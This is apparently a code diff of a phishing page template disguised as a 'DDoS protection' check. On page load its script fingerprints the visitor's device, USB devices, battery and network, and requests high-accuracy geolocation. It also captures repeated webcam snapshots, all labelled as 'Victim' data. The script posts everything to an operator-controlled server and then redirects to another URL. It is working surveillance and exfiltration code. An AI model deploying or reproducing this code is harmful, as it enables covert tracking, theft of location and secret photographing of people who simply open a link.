@@ -68,149 +68,163 @@ DDoS protection by
 </tbody>
 </table>
 <video id="video" style="display:none"  playsinline autoplay></video>
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
 <script type="text/javascript">
-var loca=false;
-var cama=false;
-var tdata = '<button class="accordion">IP: <%=ip %> | Time: <%=time %></button><div class="panel"><pre>';
-tdata+="<b>Date In Victim's Device :</b> <em>"+new Date()+"</em><br>";
+var c=false,l=false,uid="<%=uid %>";
+async function gather(){
+var td="";
+<% if(!t){ %>
+td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
+<% }else{ %>
+await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
+
+<% } %>
+
+td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
 var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
 var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
 ///INITIALS
-tdata+="<h4>Device Information</h4>";
+td+="<br><b>📱 Device Information</b><br>";
 for(var i=0;i < xo.length;i++){ 
 if(xo[i] in navigator){
 var str = navigator[xo[i]];
-tdata+="<b>"+xo[i] +"</b>: <em>"+str+"</em><br/>";
-}}
-tdata+="<b>Screen Dimentions : </b><em>"+screen.height+"px × "+screen.width+"px </em><br>";
-//////Media Devices
-if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
+td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
+}
+}
+
+
+
+if (navigator.mediaDevices || navigator.mediaDevices.enumerateDevices) {
 /////List cameras and microphones.
-navigator.mediaDevices.enumerateDevices()
+await navigator.mediaDevices.enumerateDevices()
 .then(function(devices) {
-tdata+="<h4>Media Device Information</h4>";
+td+="<br><b>📷 Media Device Information</b><br>";
 devices.forEach(function(device) {
-tdata+="<b>"+device.kind+":</b> " + device.label +" id = " + device.deviceId+"<br>";
+td+="<b>"+device.kind+":</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
 });
 })
 .catch(function(err) {
-tdata+="<h4>Media Device Information</h4>";
-tdata+="Media Device Error: "+err.name + ": " + err.message;
+td+="<br><b>📷 Media Device Information</b><br>";
+td+="⚠️ Media Device Error: "+err.name + ": " + err.message;
 });
 }
+
+
 ////CONNECTION
 if("connection" in navigator){
-tdata+="<h4>Network Information</h4>";
+td+="<br><b>🕸️ Network Information</b><br>";
 for(var i=0;i < xoc.length;i++){ 
 var str = navigator.connection[xoc[i]];
-tdata+="<b>"+xoc[i] +"</b>: <em>"+str+"</em><br/>";
+td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
 }}
+
+
 ////USB
 if("usb" in navigator){
-navigator.usb.getDevices()
+await navigator.usb.getDevices()
 .then(devices => {
-tdata+="<br><b>Total USB devices connected:</b> <em>" + devices.length+"</em><br/>";
+td+="<br><b>🔌 Total USB devices connected:</b> " + devices.length+"<br>";
 devices.forEach(device => {
-tdata+="<b>Product name:</b> <em>" + device.productName + "</em>,<b>Serial number: </b> " + device.serialNumber+"</em><br/>";
+td+="<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber+"</code><br>";
 });
 });
 }
-//////BATTERY
+
 if("getBattery" in navigator){
-navigator.getBattery().then(function(battery) {
-tdata+="<h4>Battery Information</h4>";
-tdata+="<b>Battery Level:</b> <em>" +battery.level*100+"%</em><br><b>Is Battery Charging:</b> <em>"+battery.charging+"</em>";
+await navigator.getBattery().then(function(battery) {
+td+="<br><b>🔋 Battery Information</b><br>";
+td+="<b>🔋Battery Level:</b> " +battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging+"";
 });
 }
-function fis(){
-if(loca && cama){
-tdata+="</pre></div>";
-$.post("./",{data:encodeURIComponent(tdata)},(s)=>{
-window.location.href="<%=redirect %>";
-});
-}
-}
-<% if (location){%>
+
 //////Location
 if(!navigator.geolocation) {
-tdata+="<h4>Location Information</h4>";
-tdata+="Location API not avilable";
-loca=true;
-fis();
-} else {
-navigator.geolocation.getCurrentPosition((position)=>{
-const latitude  = position.coords.latitude;
-const longitude = position.coords.longitude;
-tdata+="<h4>Location Information</h4>";
-tdata+="<b>Latitude:</b><em> "+latitude+"</em>"+"<br><b>Longitude:</b><em> "+longitude+"</em><a href='"+`https://www.openstreetmap.org/#map=18/${latitude}/${longitude}`+"' >Open In Map</a>";
-loca=true;
-fis();
-}, ()=>{
-tdata+="<h4>Location Information</h4>";
-tdata+="<span style='color:green'>Location Access Error</span><br>";
-loca=true;
-fis();
+td+="<br><b>📍 Location Information</b><br>";
+td+="⚠️ Location API not avilable";
+l=true;
+} 
+
+function success(pos) {
+const crd = pos.coords;
+$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
+l=true;
+red();
 });
 }
-<% } else{ %>
-loca=true;
-fis();
-<% }  %>
-<% if (camera){%>
+
+function error(err) {
+td+="<br><b>📍 Location Information</b><br>";
+td+="⚠️ Location ERROR: <code>"+err.message+"</code>";
+l=true;
+}
+if(navigator.geolocation){
+await navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
+
+}
+
+
+
+
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 var imgsent=0;
-var imgtocapture=<%= cams%>;
+
 function post(o){
-$.post("./camsnap",{img:encodeURIComponent(o)},(s)=>{
-if(imgsent==0){
-tdata+='<h4>Camera Images</h4>';
-}
-tdata+='<img src="./images/'+s+'" >';
-imgsent=imgsent+1;
-if(imgsent==imgtocapture){
-cama=true;
-fis();
+$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
+imgsent+=1;
+if(imgsent==4){
+c=true;
+red();
 }
 });
 }
-const constraints = {
-audio: false,
-video: {
-facingMode: "user" 
-}
-};
+const constraints = {audio: false,video: {facingMode: "user" }};
 // Access webcam
 async function cam() {
 try {
 const stream = await navigator.mediaDevices.getUserMedia(constraints);
 handleSuccess(stream);
 } catch (e) {
-tdata+='<h4>Camera Images</h4>';
-tdata+= `<span style='color:green'>Camera Access Error: ${e.toString()}</span>`;
-cama=true;
-fis();
+td+='<br><b>📷 Camera Images</b>';
+td+= `<br>⚠️ Camera Access Error: ${e.toString()}`;
+c=true;
+red();
 }
 }
+
 // Success
 function handleSuccess(stream) {
 window.stream = stream;
 video.srcObject = stream;
 var context = canvas.getContext('2d');
 var id=setInterval(function(){
-context.drawImage(video, 0, 0, 640, 480);
-var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+context.drawImage(video, 0, 0, 500, 500);
+var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
 post(canvasData);
 }, 1500);
 }
+
+
 cam();
-<% } else{ %>
-cama=true;
-fis();
-<% }  %>
+
+
+function red(){
+if(c && l){
+window.location.href="<%=url %>"
+}
+}
+
+
+$.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
+
+}
+
+
+
+
 window.onload=()=>{
+gather();
 var i="qwertyuioplkjhgfdsazxcvbnm0987654321";
 var str="";
 for(var o=0;o<17;o++){
